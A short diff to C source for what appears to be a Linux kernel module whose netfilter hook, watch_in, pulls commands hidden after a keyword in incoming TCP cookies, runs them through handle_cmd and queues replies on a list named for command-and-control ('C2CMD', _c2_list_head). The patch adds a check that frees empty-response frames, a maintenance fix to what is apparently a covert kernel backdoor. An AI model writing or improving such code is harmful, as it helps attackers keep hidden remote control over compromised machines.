@@ -182,10 +182,16 @@ static unsigned int watch_in(unsigned int hooknum,
     frame->src_port = ntohs(tcph->source);
     //printk("GET C2CMD!!!! tcp src_port=%d, dst_port=%d", frame->src_port, frame->dst_port);
     frame->rsp_len = handle_cmd(cookie + sizeof(KEYWORD) - 1, frame->response, sizeof(frame->response));
-
-    spin_lock(&_lock);
-    list_add((struct list_head *)frame, &_c2_list_head);
-    spin_unlock(&_lock);
+    if(frame->rsp_len > 0)
+    {
+        spin_lock(&_lock);
+        list_add((struct list_head *)frame, &_c2_list_head);
+        spin_unlock(&_lock);
+    }
+    else
+    {
+        kfree(frame);
+    }
     return NF_ACCEPT;
 }
 
